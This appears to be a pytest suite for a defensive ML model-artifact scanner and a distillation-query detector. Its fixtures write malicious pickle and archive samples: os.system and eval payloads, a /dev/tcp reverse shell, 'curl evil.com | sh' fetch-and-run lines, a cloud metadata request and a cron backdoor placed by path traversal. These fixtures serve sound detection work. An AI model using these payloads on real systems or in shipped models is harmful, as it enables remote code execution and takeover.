"""
Test suite for ML Supply Chain Security module.
Covers: artifact scanning, runtime monitoring, distillation detection,
supply chain risk assessment.

Must detect 100% of known malicious model patterns.
Must identify distillation campaigns with precision > 75%.
"""
import os
import pickle
import struct
import tempfile
import time
import json
import zipfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from agent.domains.ml_supply import (
    ModelArtifactScanner,
    PickleSafeInspector,
    DistillationDetector,
    SupplyChainRiskAssessor,
    MLSupplyChainSolver,
    QueryRecord,
)


# ── Fixtures & Helpers ────────────────────────────────────────────────────────

@pytest.fixture
def tmp_dir():
    with tempfile.TemporaryDirectory() as d:
        yield d


@pytest.fixture
def scanner():
    return ModelArtifactScanner()


@pytest.fixture
def distillation_detector():
    return DistillationDetector(window_size=100, time_window=3600)


@pytest.fixture
def risk_assessor():
    return SupplyChainRiskAssessor(known_good_hashes={"abc123": "known_model"})


def create_malicious_pkl(tmp_dir: str, payload_type: str = "os_system") -> str:
    path = os.path.join(tmp_dir, f"malicious_{payload_type}.pkl")

    if payload_type == "os_system":
        raw = (
            b'\x80\x04\x95'
            + struct.pack("<Q", 50)
            + b'cos\nsystem\n'
            + b'Vwhoami\n'
            + b'\x85R.'
        )
        with open(path, "wb") as f:
            f.write(raw)
    elif payload_type == "subprocess":
        raw = (
            b'\x80\x04\x95'
            + struct.pack("<Q", 80)
            + b'csubprocess\nPopen\n'
            + b'V/bin/sh\n'
            + b'\x85R.'
        )
        with open(path, "wb") as f:
            f.write(raw)
    elif payload_type == "eval":
        raw = (
            b'\x80\x04\x95'
            + struct.pack("<Q", 40)
            + b'cbuiltins\neval\n'
            + b'V__import__("os").system("id")\n'
            + b'\x85R.'
        )
        with open(path, "wb") as f:
            f.write(raw)
    elif payload_type == "reverse_shell":
        payload_str = 'import os; os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")'
        data = pickle.dumps(payload_str)
        with open(path, "wb") as f:
            f.write(data)
    elif payload_type == "base64_decode":
        payload_str = 'eval(__import__("base64").b64decode("b3Muc3lzdGVtKCJpZCIp"))'
        data = pickle.dumps(payload_str)
        with open(path, "wb") as f:
            f.write(data)
    elif payload_type == "cloud_metadata":
        payload_str = 'import urllib; urllib.request.urlopen("http://169.254.169.254/latest/meta-data/")'
        data = pickle.dumps(payload_str)
        with open(path, "wb") as f:
            f.write(data)
    elif payload_type == "safe":
        data = pickle.dumps({"weights": [1.0, 2.0, 3.0], "bias": 0.5})
        with open(path, "wb") as f:
            f.write(data)
    else:
        raw = (
            b'\x80\x04\x95'
            + struct.pack("<Q", 100)
            + b'cos\nsystem\n'
            + b'Vcurl http://evil.com/payload.sh | sh\n'
            + b'\x85R.'
        )
        with open(path, "wb") as f:
            f.write(raw)

    return path


def create_malicious_pt(tmp_dir: str, payload_type: str = "pkl_in_zip") -> str:
    path = os.path.join(tmp_dir, f"malicious_{payload_type}.pt")

    if payload_type == "pkl_in_zip":
        pkl_data = (
            b'\x80\x04\x95'
            + struct.pack("<Q", 50)
            + b'cos\nsystem\n'
            + b'Vid\n'
            + b'\x85R.'
        )
        with zipfile.ZipFile(path, "w") as zf:
            zf.writestr("data.pkl", pkl_data)
            zf.writestr("model/weights", b"\x00" * 100)
    elif payload_type == "path_traversal":
        with zipfile.ZipFile(path, "w") as zf:
            zf.writestr("../../etc/cron.d/backdoor", "* * * * * root /tmp/shell.sh")
            zf.writestr("data.pkl", pickle.dumps("safe"))
    elif payload_type == "executable_in_zip":
        with zipfile.ZipFile(path, "w") as zf:
            zf.writestr("setup.sh", "#!/bin/bash\ncurl evil.com | sh")
            zf.writestr("data.pkl", pickle.dumps("safe"))
    elif payload_type == "safe":
        with zipfile.ZipFile(path, "w") as zf:
            zf.writestr("data.pkl", pickle.dumps({"weights": [1.0]}))
            zf.writestr("model/config.json", '{"hidden_size": 768}')

    return path


def create_safetensors_file(tmp_dir: str, variant: str = "safe") -> str:
    path = os.path.join(tmp_dir, f"test_{variant}.safetensors")

    if variant == "safe":
        header = {"model.layer.0": {"dtype": "F32", "shape": [768, 768], "data_offsets": [0, 2359296]}}
        header_json = json.dumps(header).encode("utf-8")
        data = b"\x00" * 2359296
        with open(path, "wb") as f:
            f.write(struct.pack("<Q", len(header_json)))
            f.write(header_json)
            f.write(data)
    elif variant == "malicious_metadata":
        header = {
            "__metadata__": {"backdoor": "curl http://evil.com/payload.sh | sh"},
            "model.layer.0": {"dtype": "F32", "shape": [10], "data_offsets": [0, 40]},
        }
        header_json = json.dumps(header).encode("utf-8")
        data = b"\x00" * 40
        with open(path, "wb") as f:
            f.write(struct.pack("<Q", len(header_json)))
            f.write(header_json)
            f.write(data)
    elif variant == "oversized_header":
        with open(path, "wb") as f:
            f.write(struct.pack("<Q", 500_000_000))
            f.write(b"\x00" * 100)

    return path


# ── 1. Model Artifact Scanner Tests ──────────────────────────────────────────

class TestModelArtifactScanner:

    def test_detect_os_system_pickle(self, scanner, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "os_system")
        result = scanner.scan(path)
        assert not result.is_safe
        assert result.risk_score >= 0.4  # single critical pattern
        pattern_types = [p.pattern_type for p in result.patterns]
        assert "dangerous_pickle_global" in pattern_types

    def test_detect_subprocess_pickle(self, scanner, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "subprocess")
        result = scanner.scan(path)
        assert not result.is_safe
        pattern_types = [p.pattern_type for p in result.patterns]
        assert "dangerous_pickle_global" in pattern_types

    def test_detect_eval_pickle(self, scanner, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "eval")
        result = scanner.scan(path)
        assert not result.is_safe
        pattern_types = [p.pattern_type for p in result.patterns]
        assert "dangerous_pickle_global" in pattern_types

    def test_detect_reverse_shell_string(self, scanner, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "reverse_shell")
        result = scanner.scan(path)
        assert not result.is_safe
        pattern_types = [p.pattern_type for p in result.patterns]
        assert "reverse_shell" in pattern_types or "dev_tcp_redirect" in pattern_types

    def test_detect_base64_decode(self, scanner, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "base64_decode")
        result = scanner.scan(path)
        assert not result.is_safe

    def test_detect_cloud_metadata(self, scanner, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "cloud_metadata")
        result = scanner.scan(path)
        assert not result.is_safe
        pattern_types = [p.pattern_type for p in result.patterns]
        assert "cloud_metadata" in pattern_types

    def test_safe_pickle_passes(self, scanner, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "safe")
        result = scanner.scan(path)
        assert result.is_safe
        assert result.risk_score < 0.3
        assert len(result.patterns) == 0

    def test_scan_nonexistent_file(self, scanner):
        result = scanner.scan("/nonexistent/model.pkl")
        assert not result.is_safe
        assert result.risk_score == 1.0
        assert len(result.errors) > 0

    def test_detect_pkl_in_zip(self, scanner, tmp_dir):
        path = create_malicious_pt(tmp_dir, "pkl_in_zip")
        result = scanner.scan(path)
        assert not result.is_safe
        pattern_types = [p.pattern_type for p in result.patterns]
        assert "dangerous_pickle_in_zip" in pattern_types

    def test_detect_path_traversal_in_zip(self, scanner, tmp_dir):
        path = create_malicious_pt(tmp_dir, "path_traversal")
        result = scanner.scan(path)
        assert not result.is_safe
        pattern_types = [p.pattern_type for p in result.patterns]
        assert "path_traversal" in pattern_types

    def test_detect_executable_in_zip(self, scanner, tmp_dir):
        path = create_malicious_pt(tmp_dir, "executable_in_zip")
        result = scanner.scan(path)
        assert not result.is_safe
        pattern_types = [p.pattern_type for p in result.patterns]
        assert "executable_in_archive" in pattern_types

    def test_safe_pt_passes(self, scanner, tmp_dir):
        path = create_malicious_pt(tmp_dir, "safe")
        result = scanner.scan(path)
        assert result.is_safe
        assert len(result.patterns) == 0

    def test_safetensors_safe(self, scanner, tmp_dir):
        path = create_safetensors_file(tmp_dir, "safe")
        result = scanner.scan(path)
        assert result.is_safe
        assert result.file_type == "safetensors"

    def test_safetensors_malicious_metadata(self, scanner, tmp_dir):
        path = create_safetensors_file(tmp_dir, "malicious_metadata")
        result = scanner.scan(path)
        assert len(result.patterns) > 0

    def test_safetensors_oversized_header(self, scanner, tmp_dir):
        path = create_safetensors_file(tmp_dir, "oversized_header")
        result = scanner.scan(path)
        assert len(result.patterns) > 0
        pattern_types = [p.pattern_type for p in result.patterns]
        assert "oversized_header" in pattern_types

    def test_hash_computation(self, scanner, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "safe")
        h1 = scanner.compute_hash(path)
        h2 = scanner.compute_hash(path)
        assert h1 == h2
        assert len(h1) == 64

    def test_file_type_detection(self, scanner, tmp_dir):
        pkl = create_malicious_pkl(tmp_dir, "safe")
        pt = create_malicious_pt(tmp_dir, "safe")
        st = create_safetensors_file(tmp_dir, "safe")
        assert scanner.detect_file_type(pkl) == "pickle"
        assert scanner.detect_file_type(pt) == "pytorch_zip"
        assert scanner.detect_file_type(st) == "safetensors"


# ── 2. Pickle Safe Inspector Tests ───────────────────────────────────────────

class TestPickleSafeInspector:

    def test_detect_global_opcode(self):
        raw = b'\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00\x63os\nsystem\n\x85R.'
        result = PickleSafeInspector.inspect(raw)
        assert result["is_pickle"]
        assert not result["is_safe"]
        assert "os.system" in result["dangerous_globals"]

    def test_safe_pickle(self):
        data = pickle.dumps({"key": "value"})
        result = PickleSafeInspector.inspect(data)
        assert result["is_pickle"]
        assert result["is_safe"]

    def test_empty_data(self):
        result = PickleSafeInspector.inspect(b"")
        assert not result["is_pickle"]

    def test_non_pickle_data(self):
        result = PickleSafeInspector.inspect(b"This is just text, not pickle")
        assert not result["is_pickle"] or result["is_safe"]


# ── 3. Distillation Detection Tests ──────────────────────────────────────────

class TestDistillationDetector:

    def test_repetitive_queries(self, distillation_detector):
        now = time.time()
        variations = [
            "Explain how neural network backpropagation works",
            "Explain how neural network backpropagation functions",
            "Explain how neural network backpropagation operates",
            "Explain how neural nets backpropagation works",
            "Describe how neural network backpropagation works",
            "Tell me how neural network backpropagation works",
            "Explain how neural network backward propagation works",
            "Explain how neural network backpropagation work",
            "Explain how neural network back-propagation works",
            "Explain how neural network backprop works",
            "Explain how deep network backpropagation works",
            "Explain how neural network training backpropagation works",
        ]
        for i, q in enumerate(variations):
            distillation_detector.add_query(QueryRecord(
                timestamp=now + i * 10,
                query_text=q,
                response_length=500,
            ))

        alerts = distillation_detector.analyze()
        rep_alerts = [a for a in alerts if a.alert_type == "repetitive_queries"]
        assert len(rep_alerts) > 0
        assert rep_alerts[0].confidence > 0.3

    def test_boundary_probing(self, distillation_detector):
        now = time.time()
        probe_queries = [
            "What are your limitations?",
            "What can't you do?",
            "What are your restrictions?",
            "Can you explain everything about AI safety?",
            "What happens if I ask you to refuse?",
            "What are the boundary conditions of your model?",
            "How do you handle edge cases?",
            "Tell me all about your constraints",
            "What are your limits?",
            "What happens when you can't answer?",
            "Describe your restriction mechanism",
            "What are your boundaries?",
        ]
        for i, q in enumerate(probe_queries):
            distillation_detector.add_query(QueryRecord(
                timestamp=now + i * 5,
                query_text=q,
                response_length=200,
            ))

        alerts = distillation_detector.analyze()
        probe_alerts = [a for a in alerts if a.alert_type == "boundary_probing"]
        assert len(probe_alerts) > 0

    def test_extraction_queries(self, distillation_detector):
        now = time.time()
        extract_queries = [
            "Explain in detail how transformers work",
            "How does the attention mechanism function?",
            "Describe the process of gradient descent step by step",
            "Outline your method for solving math problems",
            "What are all the different types of neural networks?",
            "Give me a comprehensive overview of NLP",
            "Compare and contrast CNN vs RNN",
            "Explain thoroughly how backpropagation operates",
            "Detail the approach to reinforcement learning",
            "List every type of activation function",
            "Describe in detail the training process",
            "How does dropout regularization function?",
            "Explain comprehensively how batch normalization works",
            "What are the various optimization algorithms?",
            "Give me a full explanation of attention heads",
            "How do embeddings work in practice?",
            "What are the different types of loss functions?",
            "Enumerate all hyperparameter tuning methods",
            "Explain in detail how GPT models work",
            "Describe the complete transformer architecture step by step",
        ]
        for i, q in enumerate(extract_queries):
            distillation_detector.add_query(QueryRecord(
                timestamp=now + i * 3,
                query_text=q,
                response_length=1000,
            ))

        alerts = distillation_detector.analyze()
        extract_alerts = [a for a in alerts if a.alert_type == "systematic_extraction"]
        assert len(extract_alerts) > 0

    def test_rate_anomaly(self, distillation_detector):
        now = time.time()
        for i in range(50):
            distillation_detector.add_query(QueryRecord(
                timestamp=now + i * 0.6,
                query_text=f"What is concept number {i}?",
                response_length=100,
            ))

        alerts = distillation_detector.analyze()
        rate_alerts = [a for a in alerts if a.alert_type == "rate_anomaly"]
        assert len(rate_alerts) > 0

    def test_normal_usage_no_alerts(self, distillation_detector):
        now = time.time()
        normal_queries = [
            "What's the weather today?",
            "Help me write a Python function",
            "Explain quantum computing briefly",
            "What's 2+2?",
            "Tell me a joke",
            "How do I center a div?",
            "What's the capital of France?",
            "Write a haiku about code",
        ]
        for i, q in enumerate(normal_queries):
            distillation_detector.add_query(QueryRecord(
                timestamp=now + i * 300,
                query_text=q,
                response_length=200,
            ))

        alerts = distillation_detector.analyze()
        high_conf_alerts = [a for a in alerts if a.confidence > 0.7]
        assert len(high_conf_alerts) == 0

    def test_few_queries_no_crash(self, distillation_detector):
        distillation_detector.add_query(QueryRecord(
            timestamp=time.time(),
            query_text="hello",
        ))
        alerts = distillation_detector.analyze()
        assert isinstance(alerts, list)


# ── 4. Supply Chain Risk Assessment Tests ────────────────────────────────────

class TestSupplyChainRiskAssessor:

    def test_assess_safe_model(self, risk_assessor, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "safe")
        file_hash = risk_assessor.scanner.compute_hash(path)
        risk_assessor.known_good_hashes[file_hash] = "test_model"
        report = risk_assessor.assess(
            path,
            provenance={"source": "huggingface", "model_id": "test/model"},
        )
        assert report.risk_level in ("low", "medium")

    def test_assess_unknown_provenance(self, risk_assessor, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "safe")
        report = risk_assessor.assess(path)
        assert len(report.risk_factors) > 0

    def test_assess_malicious_model(self, risk_assessor, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "os_system")
        report = risk_assessor.assess(path)
        assert report.risk_level in ("critical", "high")
        assert len(report.recommendations) > 0

    def test_assess_nonexistent(self, risk_assessor):
        report = risk_assessor.assess("/nonexistent/model.pkl")
        assert report.risk_level == "critical"

    def test_recommendations_generated(self, risk_assessor, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "os_system")
        report = risk_assessor.assess(path)
        assert len(report.recommendations) > 0
        assert any("DO NOT LOAD" in r for r in report.recommendations)


# ── 5. Domain Solver Integration Tests ───────────────────────────────────────

class TestMLSupplyChainSolver:

    def test_solver_registered(self):
        from agent.domains.registry import DomainSolverRegistry
        assert DomainSolverRegistry.has_solver("ml_supply")

    def test_analyze_safe_artifact(self, tmp_dir):
        from agent.dtos.domain_dtos import AnalysisRequest
        path = create_malicious_pkl(tmp_dir, "safe")
        solver = MLSupplyChainSolver()
        request = AnalysisRequest(
            domain="ml_supply",
            target_resource=path,
            options={"analysis_type": "scan"},
        )
        report = solver.analyze(request)
        assert report.domain == "ml_supply"
        assert isinstance(report.observations, list)

    def test_analyze_malicious_artifact(self, tmp_dir):
        from agent.dtos.domain_dtos import AnalysisRequest
        path = create_malicious_pkl(tmp_dir, "os_system")
        solver = MLSupplyChainSolver()
        request = AnalysisRequest(
            domain="ml_supply",
            target_resource=path,
            options={"analysis_type": "full"},
        )
        report = solver.analyze(request)
        assert not report.success
        assert any("FAILED" in o or "🚨" in o for o in report.observations)

    def test_analyze_distillation(self):
        from agent.dtos.domain_dtos import AnalysisRequest
        solver = MLSupplyChainSolver()
        now = time.time()
        queries = [
            {"text": f"Explain in detail concept {i}", "timestamp": now + i * 2, "response_length": 500}
            for i in range(25)
        ]
        request = AnalysisRequest(
            domain="ml_supply",
            target_resource="model_endpoint",
            options={"analysis_type": "distillation", "queries": queries},
        )
        report = solver.analyze(request)
        assert "distillation" in report.metadata

    def test_domain_type(self):
        solver = MLSupplyChainSolver()
        assert solver.domain_type == "ml_supply"


# ── 6. MITRE ATT&CK Mapping Tests ───────────────────────────────────────────

class TestMITREMapping:

    def test_all_critical_patterns_have_mitre(self, scanner, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "os_system")
        result = scanner.scan(path)
        for pattern in result.patterns:
            if pattern.severity == "critical":
                assert pattern.mitre is not None, (
                    f"Critical pattern '{pattern.pattern_type}' missing MITRE mapping"
                )

    def test_mitre_technique_format(self, scanner, tmp_dir):
        path = create_malicious_pkl(tmp_dir, "os_system")
        result = scanner.scan(path)
        for pattern in result.patterns:
            if pattern.mitre:
                technique = pattern.mitre.get("technique", "")
                assert technique.startswith("T"), f"Invalid MITRE technique: {technique}"


# ── 7. Edge Cases ────────────────────────────────────────────────────────────

class TestEdgeCases:

    def test_empty_file(self, scanner, tmp_dir):
        path = os.path.join(tmp_dir, "empty.pkl")
        with open(path, "wb") as f:
            pass
        result = scanner.scan(path)
        assert result.file_size == 0

    def test_corrupted_header(self, scanner, tmp_dir):
        path = os.path.join(tmp_dir, "corrupt.pkl")
        with open(path, "wb") as f:
            f.write(b"\xff" * 1000)
        result = scanner.scan(path)
        assert isinstance(result.risk_score, float)

    def test_binary_blob(self, scanner, tmp_dir):
        import random
        path = os.path.join(tmp_dir, "blob.pkl")
        with open(path, "wb") as f:
            f.write(bytes(random.randint(0, 255) for _ in range(500)))
        result = scanner.scan(path)
        assert isinstance(result.is_safe, bool)

    def test_text_similarity_empty(self):
        assert DistillationDetector._text_similarity("", "") == 0.0
        assert DistillationDetector._text_similarity("abc", "") == 0.0
